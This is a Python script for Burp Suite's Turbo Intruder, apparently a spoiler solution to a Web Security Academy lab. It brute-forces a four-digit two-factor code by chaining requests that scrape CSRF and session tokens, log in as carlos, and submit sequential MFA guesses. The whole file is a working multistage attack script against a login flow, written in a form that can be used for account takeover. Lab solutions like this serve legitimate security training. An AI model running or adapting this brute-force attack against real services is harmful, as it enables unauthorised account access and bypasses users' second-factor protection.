# Spoilers for 2FA bypass using brute-force attack for web academy
# TODO: allow for multiple instances of this to run so that it won't take the maximum estimated time of 6.6 hours
# Code for a multistage bruteforce attack on a 4 digit 2FA code for use with burp intruder
# Used code from here as a base/inspiration: https://hackmag.com/security/burp-stepper-intruder/

# The request used for this attack was

# GET /login HTTP/2
# Host: 0a0900e7031ea4ed8338142e005a003f.web-security-academy.net
# tmp: %s

import re
import time

csrfToken = ''
session = ''
re_csrf = 'value="[\w\d]+'
re_session = 'session=[\w\d]+'
iterable = 0
found = False

# Since Turbo Intruder has no console, debug outputs will be written to this file
writeFile = "/tmp/TI.txt"
# The host to attack
host = "0a880061030ae79f823bc677009900a9.web-security-academy.net"

# I have NO idea why but the escapes are needed exactly where they are when crafting a request

# Used to obtain the /login session and csrfToken
req1 = 'GET /login HTTP/2\r\nHost: ' + host + '\r\nTmp: %s\r\n\r\n'
# Used to submit the provided username and password
req2 = 'POST /login HTTP/2\r\nHost: ' + host + '\r\nCookie: session=%s\r\nContent-Length: 70\r\n\r\ncsrf=%s&username=carlos&password=montoya'
# Used to get the new csrf token from the /login2 page
req3 = 'GET /login2 HTTP/2\r\nHost: ' + host + '\r\nCookie: session=%s\r\n\r\n'
# Used to submit a guess at the MFA code
req4 = 'POST /login2 HTTP/2\r\nHost: ' + host + '\r\nCookie: session=%s\r\nContent-Length: 53\r\n\r\ncsrf=%s&mfa-code=%s'

def queueRequests(target, wordlists):
    global engine
    engine = RequestEngine(endpoint=("https://" + host + ":443"),
                           concurrentConnections=1,
                           requestsPerConnection=14,
                           pipeline=False
                           )
    f = open(writeFile, "w")
    f.write("Starting attack\n")
    f.close()
    # might need to limit requests here
    #for x in range(1,6):
    engine.queue(req1, "JMU")
        #time.sleep(3)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    # The initial response that gives you the csrf token and the session token
    global csrfToken
    global session
    global iterable
    global found

    # keeps the page alive for when you come back
    if(found):
        table.add(req)
        time.sleep(5)
        engine.queue(req1, "FOUND")
    # stops any other connections with their next request
    elif(iterable >= 10000):
        return None
    #table.add(req)
    elif 'Username' in req.response:
        table.add(req)
        # Obtaining the session and csrf token from the /login page
        #f = open(writeFile, "a")
        csrfToken = (re.search(re_csrf, req.response).group())[-32:]
        #f.write("csrfToken = " + csrfToken +"\n")
        session = (re.search(re_session, req.response)).group()[-32:]
        #f.write("session token = " + session + "\n")
        #f.close()
        # Craft the new post request with the session, csrf, username, and password
        # print("2. POST /login Request")
        engine.queue(req2, [session, csrfToken])
    elif 'Location: /login2' in req.response:
        # Grab the new session token for the /login2 redirect
        #f = open(writeFile, "a")
        #f.write("Redirecting\r\n\r\n")
        session = (re.search(re_session, req.response)).group()[-32:]
        #f.write("new session Token: " + session + "\n")
        #f.close()
        #table.add(req)
        engine.queue(req3, session)
    elif 'Incorrect security code' in req.response:
        # Failed guess at the MFA, retrying
        table.add(req)
        engine.queue(req1, "JMU")
    elif '4-digit security code' in req.response:
        # Enter in your attmpt to guess the 4 diget mfa code
        f = open(writeFile, "a")
        f.write("Obtaining MFA csrf Token\r\n\r\n")
        f.write("Maintaining session token: " + session + "\n")
        csrfToken = (re.search(re_csrf, req.response).group())[-32:]
        f.write("csrfToken = " + csrfToken +"\n")
        iterable += 1
        f.write("guessing with " + str(iterable) + "\n")
        f.close()
        #table.add(req)
        engine.queue(req4, [session, csrfToken, str(iterable).zfill(4)])
    else:
        found = True
        table.add(req)
        f = open(writeFile, "a")
        f.write("You won with guess " + str(iterable))
        f.close()
        engine.queue(req1, "FOUND")